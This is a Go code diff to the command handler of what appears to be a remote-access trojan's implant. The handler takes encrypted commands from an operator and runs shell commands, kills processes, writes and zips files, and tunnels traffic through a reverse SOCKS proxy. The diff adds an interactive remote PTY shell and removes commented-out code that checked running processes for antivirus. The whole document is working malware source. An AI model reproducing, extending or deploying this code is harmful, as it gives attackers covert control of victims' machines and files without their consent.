@@ -8,6 +8,7 @@ import (
 	"io/ioutil"
 	"main/Encrypt"
 	"main/PcInfo"
+	"main/util/setchannel"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -18,14 +19,12 @@ import (
 	"main/Helper/handle"
 	Proxy "main/Helper/proxy"
 	"main/MessagePack"
-
-	"github.com/togettoyou/wsc"
 )
 
 var ProcessPath string
 var FilePath string
 
-func Read(Data []byte, Connection *wsc.Wsc) {
+func Read[T any](Data []byte, Connection T, SendData func([]byte, T)) {
 	unmsgpack := new(MessagePack.MsgPack)
 	deData, err := Encrypt.Decrypt(Data)
 	if err != nil {
@@ -42,11 +41,11 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 		result := ""
 		output, err := cmd.Output()
 		if err != nil {
-			//Log(err.Error(), Connection, *unmsgpack)
+			//Log(err.Error(),Connection,SendData, *unmsgpack)
 			result = err.Error()
 		}
 		result = string(output)
-		SessionLog(result, "", Connection, unmsgpack)
+		Function.SessionLog(result, "", Connection, SendData, unmsgpack)
 	case "getDrivers":
 		{
 			handle.GetDrivers(Connection, SendData, unmsgpack)
@@ -59,36 +58,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 
 	case "CheckAV":
 		{
-			// processList, err := process.Processes()
-			// if err != nil {
-			// 	fmt.Printf("Error fetching processes: %s\n", err)
-			// 	return
-			// }
 
-			// var stringBuilder strings.Builder
-			// for _, proc := range processList {
-			// 	name, err := proc.Name()
-			// 	if err != nil {
-			// 		continue
-			// 	}
-			// 	stringBuilder.WriteString(name + "-=>")
-			// }
-			// fmt.Println(stringBuilder.String())
-			// result := ""
-			// result = string(stringBuilder.String())
-			// utf8Stdout, err := Helper.ConvertGBKToUTF8(result)
-			// if err != nil {
-			// 	//Log(err.Error(), Connection, unmsgpack)
-			// 	utf8Stdout = err.Error()
-			// }
-			// msgpack := new(MessagePack.MsgPack)
-			// msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
-			// msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
-			// msgpack.ForcePathObject("Domain").SetAsString("CheckAVInfo")
-			// msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
-			// msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
-			// msgpack.ForcePathObject("ProcessInfo").SetAsString(utf8Stdout)
-			// SendData(msgpack.Encode2Bytes(), Connection)
 		}
 	case "getPath":
 		{
@@ -119,9 +89,9 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 			pid, err := strconv.Atoi(PID)
 			handle.KillProcess(pid)
 			if err != nil {
-				SessionLog(err.Error(), "", Connection, unmsgpack)
+				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
 			} else {
-				SessionLog("Process %d killed.\n", "", Connection, unmsgpack)
+				Function.SessionLog("Process %d killed.\n", "", Connection, SendData, unmsgpack)
 			}
 			handle.ProcessInfo(Connection, SendData, unmsgpack)
 		}
@@ -155,7 +125,7 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 			normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "/")
 			err := ioutil.WriteFile(normalizedPathStr, unmsgpack.ForcePathObject("FileBin").GetAsBytes(), 0644)
 			if err != nil {
-				SessionLog("File writing failed! , please elevate privileges", "", Connection, unmsgpack)
+				Function.SessionLog("File writing failed! , please elevate privileges", "", Connection, SendData, unmsgpack)
 			}
 			handle.RefreshDir(Connection, SendData, unmsgpack)
 		}
@@ -200,13 +170,13 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 		{
 			file, err := os.Create(unmsgpack.ForcePathObject("NewFileName").GetAsString())
 			if err != nil {
-				SessionLog(err.Error(), "", Connection, unmsgpack)
+				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
 				return
 			}
 			defer file.Close()
 			result, err := handle.ListDir(unmsgpack.ForcePathObject("FileDir").GetAsString())
 			if err != nil {
-				SessionLog(err.Error(), "", Connection, unmsgpack)
+				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
 				return
 			}
 			msgpack := new(MessagePack.MsgPack)
@@ -224,19 +194,19 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
 			err := handle.Zip(filename, filename+".zip")
 			if err != nil {
-				SessionLog(err.Error(), "", Connection, unmsgpack)
+				Function.SessionLog(err.Error(), "", Connection, SendData, unmsgpack)
 			}
 		}
 	case "UNZIP":
 		{
 			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
 			if !strings.HasSuffix(filename, ".zip") {
-				SessionLog("FileName does not end with .zip", "", Connection, unmsgpack)
+				Function.SessionLog("FileName does not end with .zip", "", Connection, SendData, unmsgpack)
 				return
 			}
 			err := handle.Unzip(filename, strings.ReplaceAll(filename, ".zip", ""))
 			if err != nil {
-				SessionLog((err.Error()), "", Connection, unmsgpack)
+				Function.SessionLog((err.Error()), "", Connection, SendData, unmsgpack)
 			}
 
 		}
@@ -296,6 +266,21 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 			os.Exit(0)
 
 		}
+	case "shell":
+		{
+			go handle.PtyCmd(unmsgpack.ForcePathObject("HWID").GetAsString(), unmsgpack, Connection, SendData)
+			break
+		}
+	case "shellWriteInput":
+		{
+			sendUserId := unmsgpack.ForcePathObject("HWID").GetAsString()
+			m, exist := setchannel.GetPtyDataChan(sendUserId)
+			if !exist {
+				m = make(chan interface{})
+				setchannel.AddPtyDataChan(sendUserId, m)
+			}
+			m <- []byte(strings.Replace(unmsgpack.ForcePathObject("WriteInput").GetAsString(), "\r\n", "", -1) + "\n")
+		}
 
 	case "ReverseProxy":
 		{
@@ -305,18 +290,8 @@ func Read(Data []byte, Connection *wsc.Wsc) {
 			HPID := unmsgpack.ForcePathObject("HPID").GetAsString()
 			UserName := unmsgpack.ForcePathObject("UserName").GetAsString()
 			Password := unmsgpack.ForcePathObject("Password").GetAsString()
-			fmt.Println(Host + ":" + TunnelPort)
-			Proxy.ReverseSocksAgent(Host+":"+TunnelPort, "password", false, Connection, Function.SendData, TunnelPort, Socks5Port, HPID, UserName, Password)
-			//ReverseSocksAgent(serverAddress, psk, useTLS, wscConn, Function.SendData, TunnelPort, Socks5Port, HPID, UserName, Password)
+			Proxy.ReverseSocksAgent(Host+":"+TunnelPort, "password", false, Connection, SendData, TunnelPort, Socks5Port, HPID, UserName, Password)
 		}
 
 	}
-}
-
-func SendData(b []byte, Connection *wsc.Wsc) {
-	Function.SendData(b, Connection)
-}
-
-func SessionLog(result string, Domain string, Connection *wsc.Wsc, msgPack *MessagePack.MsgPack) {
-	Function.SessionLogA(result, Domain, Connection, SendData, msgPack)
 }
